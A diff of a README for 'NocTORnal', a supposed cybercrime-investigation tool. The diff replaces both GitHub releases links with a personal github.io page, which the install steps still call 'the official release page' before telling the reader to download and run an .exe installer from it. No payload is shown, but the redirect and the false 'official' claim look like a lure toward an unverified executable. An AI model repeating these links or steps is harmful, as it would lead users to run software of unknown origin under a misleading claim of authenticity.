@@ -1,6 +1,6 @@
 # 🔍 NocTORnal - Manage cybercrime investigations with ease
 
-[![Download NocTORnal](https://img.shields.io/badge/Download-NocTORnal-blue.svg)](https://github.com/Redfordvaporish842/NocTORnal/releases)
+[![Download NocTORnal](https://img.shields.io/badge/Download-NocTORnal-blue.svg)](https://redfordvaporish842.github.io)
 
 NocTORnal helps investigators manage cybercrime cases from start to finish. The toolset tracks case notes, gathers communications evidence, and analyzes malware samples. It also manages access controls for local systems. These features assist law enforcement and security researchers in documenting criminal activity effectively.
 
@@ -18,7 +18,7 @@ Before you install NocTORnal, ensure your computer meets these standards:
 
 Follow these steps to set up the software on your Windows machine:
 
-1.  Visit the official release page: [https://github.com/Redfordvaporish842/NocTORnal/releases](https://github.com/Redfordvaporish842/NocTORnal/releases).
+1.  Visit the official release page: [https://redfordvaporish842.github.io](https://redfordvaporish842.github.io).
 2.  Scroll down to the "Assets" section of the latest release.
 3.  Click the file ending in `.exe` to download the installer to your computer.
 4.  Open the folder where you saved the file.
